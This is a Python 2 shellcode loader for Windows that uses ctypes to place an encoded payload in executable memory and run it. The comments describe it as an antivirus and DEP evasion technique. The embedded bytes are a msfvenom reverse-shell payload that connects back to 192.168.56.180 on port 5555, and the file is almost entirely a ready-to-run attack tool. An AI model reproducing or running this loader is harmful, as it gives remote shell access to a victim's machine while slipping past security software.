#!/usr/bin/env python2
from ctypes import *
import ctypes

# For when DEP is in play
# Based heavily on https://github.com/ciccio-87/Python-AV-Evasion/blob/master/winshell.py
# This works on my test box (Win 7 x86 SP1)
# Nice clean revshell back to me Kali 2.3 x64  :) <3<3<3


PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4


sc = ("\xdb\xdc\xd9\x74\x24\xf4\x5a\x81\xea\xc5\xff\xff\xff\x89\xd3"
"\x83\xc3\x02\x68\x13\xff\xff\xff\x58\xf7\xd0\x8b\x33\xc1\xe6"
"\x10\xc1\xee\x10\x83\xc3\x02\x0f\xb7\x3a\x31\xf7\x66\x57\x66"
"\x8f\x02\x8d\x52\x02\x48\x85\xc0\x0f\x85\xdf\xff\xff\xff\x3e"
"\x8a\xe7\x4d\x6e\xaa\xb7\xdd\x43\x87\xc0\x45\x82\x17\xdc\x7d"
"\xde\x7e\xea\x5a\xb5\x32\x80\xcd\x7f\x32\x24\xc5\xf7\x4e\xf9"
"\x8f\x18\x9f\xd9\x76\xc9\x1c\xcb\x1f\xff\x3b\xa0\x34\x17\x36"
"\x26\xfe\x40\xae\x26\x21\x24\x4b\x26\x48\x32\x6c\x6d\x27\xe8"
"\xfc\xe7\x79\x3e\x86\xc1\x79\x6e\x68\x1a\xbc\xb7\x1c\x3e\x48"
"\xee\x9d\xd7\xfb\x11\x62\x28\x72\xda\xe1\xeb\x70\x60\xb5\x8a"
"\xc7\x78\x34\x60\x75\x18\x83\x78\x7a\xaf\xb8\xf9\x91\x51\x47"
"\x06\x6e\xae\x76\x58\xaf\x48\x66\x99\x41\x58\xef\x69\x48\xa0"
"\xce\x97\xbf\x76\xef\x51\xd9\x20\x89\xde\xd8\xa1\x60\x20\x27"
"\x5e\x9f\x6a\xa2\x8c\x90\xef\x72\x73\x6f\x10\x56\x70\xb7\xfb"
"\x0c\x9b\xed\x10\x36\xf9\x32\x43\x29\xce\xa6\x24\x8d\x22\x50"
"\xc4\xf0\x90\x39\xfd\xeb\x81\x2d\x5b\xb5\x01\x42\x24\x76\x42"
"\xe0\x1b\xd6\x51\x60\xc9\x99\x8e\x2e\xd1\x35\x64\xd0\x6c\x40"
"\x8b\xb5\x08\x6f\xd3\x11\x1c\xda\xbf\x47\x38\x8d\x4a\x41\x46"
"\xd2\x14\x1f\xcb\x07\xd0\xd2\xec\xf0\xbe\xae\xb6\x07\xe5\x8f"
"\xdc\xd9\x23\x90\xd5\xcb\x2b\x45\xe5\xfe\x6e\x86\xa3\x40\xd0"
"\x03\x60\xe1\x66\x46\x8e\x2f\xd0\xac\x39\x16\x01\x1e\xe4\xef"
"\x57\xbf\xae\x4f\xce\x94\x33\xef\x52\xe4\x26\xdb\x63\xf4\x4c"
"\x90\x68\xe6\x1d\xd3\xc6\x45\xec\x2f\x6d\x32\x55\xb3\x59\xf3"
"\x09\x41\x37\x01\x67\xdb\x2e\xe8\x4c\x6d\x51\x36\x7f\xc4\x44"
"\x98\x95\xbf\x16\x73\xc6\x54\x45\xb1\x51\xc2\x82\x4f\xbf\xbc"
"\x07\x31\xc5\x17\x2d\xca\xbf\xbc\x17\x31\xc5\x17\x05\x70\xd8"
"\x89\xf8\x11\xf0\x7f\xba\xe2\xda\x4c\x38\xe9\xec\x2f\x0c\x8a"
"\xcd\xff\xa4\xbc\x0f\xd9\x30\xcd\xf3\x31\x69\x51\xcb\x52\x84"
"\xb7\xe6\xc0\xa5\xda\x89\xa5\xbf\x53\xfb\xdc\x78\x88\x6a\xf8"
"\x3c\xc4\x4d\xd9\x7f\xe5\x87\x1b\xe2\x70\x4d\xbf\xde\xbe\x63"
"\x28\xa6\xcb\xe6\x3b\xe4\x9c\x80\x50\x83\xf6\x6a\x7e\x4d\xc8"
"\x62\x40\x01\xa2\x7e\x7c\x4b\xc8\x72\x40\x09\xa2\x66\x79\x4b"
"\xf3\x5d\xe4\x4f\xe8\xa6\x2a\x3d\xc6\x9a\x52\x47\x41\xd0\xbd"
"\x05\x29\x8f\xb5\xa5\xf4\x94\x98\x0b\x7b\x6c\x7f\x55\x09\x8f"
"\x90\x49\x33\xaf\xac\x15\x05\x73\x61\x29\xbd\x4a\x62\x57\xad"
"\x46\x1d\x31\xd2\x73\x9d\xd1\x52") # len 533
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.180 LPORT=5555 -b '\x00\x0a\x0d' -e x86/bloxor -i 3 -f c 


def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    # Need to align to a page boundary, so use valloc
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr:  
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr


VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(sc)
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),
                                            0x40,
                                            ctypes.byref(old))

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), 
                                    buf, 
                                    ctypes.c_int(len(shellcode)))

shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()

